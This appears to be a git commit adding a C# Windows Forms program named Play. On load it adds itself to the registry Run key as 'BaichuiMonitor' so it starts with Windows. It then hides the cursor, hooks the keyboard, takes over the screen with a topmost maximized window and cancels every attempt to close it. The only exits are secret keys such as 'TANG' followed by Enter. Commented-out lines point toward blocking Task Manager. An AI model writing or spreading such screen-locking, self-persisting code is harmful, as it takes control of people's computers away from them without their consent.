f5974ac7895bf84de98d07c72a2dc4b6f97c0064
sdgey <3456818950@qq.com>
2022-08-28 15:51:01 +0800

    第一次上传

---
+++ Play/Play.Designer.cs
@@ -0,0 +1,67 @@
+﻿
+namespace Play
+{
+    partial class Play
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要修改
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Play));
+            this.SuspendLayout();
+            // 
+            // Play
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(12)))), ((int)(((byte)(118)))), ((int)(((byte)(217)))));
+            this.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("$this.BackgroundImage")));
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
+            this.ClientSize = new System.Drawing.Size(1354, 773);
+            this.ControlBox = false;
+            this.DoubleBuffered = true;
+            this.ForeColor = System.Drawing.Color.White;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.KeyPreview = true;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Play";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.TopMost = true;
+            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.Paint += new System.Windows.Forms.PaintEventHandler(this.Form1_Paint);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+    }
+}
+
---
+++ Play/Play.cs
@@ -0,0 +1,143 @@
+﻿using System;
+using System.Drawing;
+using System.Windows.Forms;
+using System.Diagnostics;
+using System.IO;
+using System.Threading;
+using System.Runtime.InteropServices;
+using Microsoft.Win32;
+
+namespace Play
+{
+    public partial class Play : Form
+    {
+        public Play()
+        {
+            InitializeComponent();
+        }
+
+        private string Key = "";
+
+        //禁止通过拖动，双击标题栏改变窗体大小。
+        public const int WM_NCLBUTTONDBLCLK = 0xA3;
+        const int WM_NCLBUTTONDOWN = 0x00A1;
+        const int HTCAPTION = 2;
+        protected override void WndProc(ref Message m)
+        {
+            if (m.Msg == WM_NCLBUTTONDOWN && m.WParam.ToInt32() == HTCAPTION)
+                return;
+            if (m.Msg == WM_NCLBUTTONDBLCLK)
+                return;
+            base.WndProc(ref m);
+        }
+        private HookKeyBoard hkb = null;
+
+        //引入API函数
+        [DllImport("user32 ")]
+        //这个是调用windows的系统锁定
+        public static extern bool LockWorkStation();
+        [DllImport("user32.dll")]
+        static extern void BlockInput(bool Block);
+
+
+
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
+        ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            registryKey.SetValue("BaichuiMonitor", Application.ExecutablePath);//"BaichuiMonitor"可以自定义
+            //FileStream fs = new FileStream(System.IO.Path.Combine(Environment.SystemDirectory, "taskmgr.exe"), FileMode.Open, FileAccess.ReadWrite, FileShare.None);
+            ControlBox = false; //不在窗体标题栏中显示控件
+            ShowCursor(0);
+            DisabledMouseKey();
+            Thread.Sleep(20000);
+            //while (true)
+            //{
+            //    Play p = new Play();
+            //    p.ShowDialog();
+            //}
+            //DialogResult t = MessageBox.Show("程序加载失败！", "警告", MessageBoxButtons.RetryCancel, MessageBoxIcon.Warning);
+            //if (t == DialogResult.Retry)
+            //Thread.Sleep(10000);
+            //return;
+            //try
+            //{
+            //    //bat文件路径
+            //    string path = "D:\\BC\\Tool\\1.bat";
+            //    Process pro = new Process();
+            //    FileInfo file = new FileInfo(path);
+            //    pro.StartInfo.WorkingDirectory = file.Directory.FullName;
+            //    pro.StartInfo.FileName = path;
+            //    pro.StartInfo.CreateNoWindow = false;
+            //    pro.Start();
+            //    pro.WaitForExit();
+            //}
+            //catch (Exception ex)
+            //{
+            //    //MessageBox.Show("执行失败! 错误原因:" + ex.Message);
+            //}
+
+        }
+
+        private void DisabledMouseKey()
+        {
+            hkb = new HookKeyBoard();
+            hkb.keyeventhandler += new KeyEventHandler(keyhandler);
+            hkb.InstallHook(this);
+            HookKeyBoard.tagMSG Msgs;
+            while (HookKeyBoard.GetMessage(out Msgs, IntPtr.Zero, 0, 0) > 0)
+            {
+                HookKeyBoard.TranslateMessage(ref Msgs);
+                HookKeyBoard.DispatchMessage(ref Msgs);
+            }
+        }
+
+        private void EnableMouseKey()
+        {
+            hkb.Hook_Clear();
+        }
+
+        /// <summary>
+        /// 设立一个口子，以防禁用完还得重启
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void keyhandler(object sender, KeyEventArgs e)
+        {
+            if (!string.IsNullOrEmpty(Key) && e.KeyCode == Keys.Enter)
+                if (Key.Equals("TANG"))
+                    Application.ExitThread();
+            Key += e.KeyData.ToString();
+            if (e.KeyCode == Keys.Delete)
+                Key = "";
+            if (e.KeyCode == Keys.Escape)
+                Application.ExitThread();
+            if (e.KeyData.ToString() == "b" || e.KeyData.ToString() == "B")
+            {
+                hkb.Hook_Clear();
+                ShowCursor(1);
+            }
+        }
+
+        private void Form1_Paint(object sender, PaintEventArgs e)
+        {
+            ControlPaint.DrawBorder(e.Graphics, ClientRectangle, Color.FromArgb(11, 118, 216), ButtonBorderStyle.Solid);
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+        }
+        /// <summary>
+        /// 控制鼠标指针显示和隐藏
+        /// </summary>
+        /// <summary>
+        /// 调用系统API函数操作鼠标指针
+        /// </summary>
+        /// <param name="status">0表示隐藏鼠标指针，1表示显示鼠标指针</param>
+        [DllImport("user32.dll", EntryPoint = "ShowCursor", CharSet = CharSet.Auto)]
+        public static extern void ShowCursor(int status);
+
+    }
+}
